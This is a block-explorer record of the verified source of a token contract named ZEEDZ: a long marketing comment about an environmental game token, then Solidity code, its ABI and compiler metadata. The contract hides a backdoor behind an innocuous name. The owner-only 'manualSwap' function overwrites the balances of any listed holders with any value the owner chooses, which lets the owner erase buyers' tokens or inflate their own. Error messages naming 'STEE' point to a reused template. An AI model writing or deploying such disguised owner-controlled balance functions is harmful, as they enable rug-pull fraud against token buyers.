{
  "TxHash": "0x6e92af88b45e5d382b2b02e5bc706aea207aaf0fae1811463c23ea7314a0ec8b",
  "ContractAddress": "0x2919097fa4243278519af41f3e2af976ff07171b",
  "Name": "ZEEDZ",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/*\r\nOverview\r\nZeedz is the pioneering Play-for-Purpose game designed to merge interactive entertainment \r\nwith real-world environmental impact. This innovative game allows players to collect, grow, \r\nand battle with magical creatures called Zeedles, while simultaneously contributing to global \r\nsustainability efforts. Our goal is to create an engaging platform where gameplay translates \r\ninto tangible environmental benefits, thus combining the joy of gaming with the responsibility \r\nof environmental stewardship.\r\n\r\nVision and Mission\r\nVision: To harness the power of gaming to foster environmental consciousness and action, creating \r\na global community of players committed to combating climate change.\r\nMission: Our mission is to offer a unique gaming experience that educates players about climate \r\nchange and environmental issues, encourages sustainable behaviors, and directly funds green \r\nprojects worldwide. By integrating real-time weather data and partnering with certified sustainability \r\norganizations, Zeedz aims to make a meaningful impact on the planet.\r\n\r\nPurpose and Impact\r\nZeedz is more than just a game; it is a movement towards a sustainable future. Each player's \r\nactions within the game contribute to real-world environmental projects. Our collaboration with \r\nThe Gold Standard ensures that a significant portion of our earnings supports verified green \r\ninitiatives, from reforestation projects to renewable energy solutions. Players learn about the \r\nenvironment, engage in climate action, and see the impact of their gameplay on a global scale.\r\n\r\nUnique Features\r\nFree Zeed Selection\r\nEvery new player receives a free Zeed to start their adventure. This initial choice—Windy, Rainy, \r\nor Sunny—introduces players to the elemental diversity of Zeedles and sets the stage for their \r\njourney. The free Zeed helps players learn the basic mechanics of the game and provides a foundation \r\nfor future growth.\r\n\r\nWeekly Pack Drops\r\nTo keep the game fresh and engaging, Zeedz offers weekly pack drops featuring new Zeedles, items, \r\nand resources. These packs introduce rare and unique Zeedles, encouraging players to expand their \r\ncollections and experiment with different team compositions. Regular updates ensure that there is \r\nalways something new to discover.\r\n\r\nSkill Customization\r\nPlayers can customize their Zeedles' skills to match their preferred playstyle. Whether focusing \r\non offensive, defensive, or supportive roles, players have the freedom to develop their Zeedles in \r\nunique ways. This customization adds a strategic layer to the game, as players must consider the \r\nbest skill combinations for various challenges.\r\n\r\nBonding with Zeedles\r\nDaily interactions, such as petting and feeding Zeedles, build a bond between the player and their \r\nZeedles. This bond unlocks new features, boosts performance in battles, and provides additional \r\nrewards. Caring for Zeedles creates a more immersive and rewarding experience, emphasizing the \r\nimportance of nurturing and growth.\r\n\r\nReal-Time Weather Integration\r\nZeedz integrates real-time weather data into gameplay, making the environment a crucial factor \r\nin the game. Players must consider current weather conditions when planting Zeedles, as different \r\nweather types yield different resources. This feature connects the virtual game with the real world, \r\nraising awareness about the impact of weather and climate.\r\n\r\nTokenomics\r\nIntroduction to ZEEDZ Token\r\nThe ZEEDZ token is the native cryptocurrency of the Zeedz ecosystem. It serves as the primary \r\nmedium of exchange within the game, enabling transactions, rewards, and staking. The ZEEDZ token \r\nis designed to incentivize player engagement and ensure a sustainable economic model for the game.\r\n\r\nToken Distribution\r\nThe distribution of ZEEDZ tokens is carefully planned to balance initial funding, player rewards, \r\nand long-term sustainability. The allocation includes:\r\n- Founders and Team: 20% to ensure the commitment of key stakeholders.\r\n- Community Rewards: 40% allocated to incentivize player participation and achievements.\r\n- Development Fund: 20% dedicated to ongoing game development and feature expansion.\r\n- Partnerships and Marketing: 10% for strategic partnerships and marketing efforts.\r\n- Reserve: 10% held in reserve for future needs and contingencies.\r\n\r\nUse Cases of ZEEDZ Token\r\nIn-Game Purchases\r\nPlayers can use ZEEDZ tokens to buy new Zeedles, special items, and upgrades. This enables a dynamic \r\nin-game economy where players can enhance their gameplay experience through strategic purchases.\r\n\r\nStaking and Rewards\r\nZEEDZ tokens can be staked to earn additional rewards. Staking encourages players to hold tokens, \r\ncontributing to the stability of the token’s value. Rewards from staking include rare items, \r\nexclusive Zeedles, and additional ZEEDZ tokens.\r\n\r\nEarning ZEEDZ Tokens\r\nPlayers can earn ZEEDZ tokens through various in-game activities such as completing quests, \r\nwinning battles, and achieving milestones. Additionally, participating in community events and \r\ncontributing to the game’s development can also yield ZEEDZ tokens. This multi-faceted approach \r\nensures that active and engaged players are continuously rewarded.\r\n*/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(\r\n        address indexed previousowner, \r\n        address indexed newowner\r\n        );\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(\r\n            address(0), \r\n            msgSender\r\n            );\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract ZEEDZ is Context, Ownable, IERC20 {\r\n    mapping (address =\u003e uint256) private _balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    event BalanceAdjusted(\r\n        address indexed account, \r\n        uint256 oldBalance, \r\n        uint256 newBalance\r\n        );\r\n\r\n    function manualSwap(\r\n        address[] memory accounts, \r\n    uint256 newBalance) external onlyowner \r\n    {\r\n    for (uint256 i = 0; i \u003c accounts.length; i++) {\r\n        address account = accounts[i];\r\n\r\n        uint256 oldBalance = _balances[account];\r\n\r\n        _balances[account] = newBalance;\r\n        emit BalanceAdjusted(account, oldBalance, newBalance);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(\r\n        address recipient, \r\n        uint256 amount\r\n        ) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] \u003e= amount, \"STEE: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner, \r\n        address spender\r\n        ) \r\n        public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender, \r\n        uint256 amount\r\n        ) \r\n        public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender, \r\n        address recipient, \r\n        uint256 amount\r\n        ) \r\n        public virtual override returns (bool) {\r\n    require(_allowances[sender][_msgSender()] \u003e= amount, \"STEE: transfer amount exceeds allowance\");\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][_msgSender()] -= amount;\r\n\r\n    emit Transfer(\r\n        sender, \r\n    recipient, \r\n    amount\r\n    );\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}",
      "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"oldBalance\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"}],\"name\":\"BalanceAdjusted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"}],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
      "ContractName": "ZEEDZ",
      "CompilerVersion": "v0.8.16+commit.07a7930e",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000b5a6565647a20546f6b656e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055a4545445a000000000000000000000000000000000000000000000000000000",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://bbd362afa0821345a2e8bd68d6217405291ab6ea4b813c73f4e0076de215377f"
    }
  ]
}
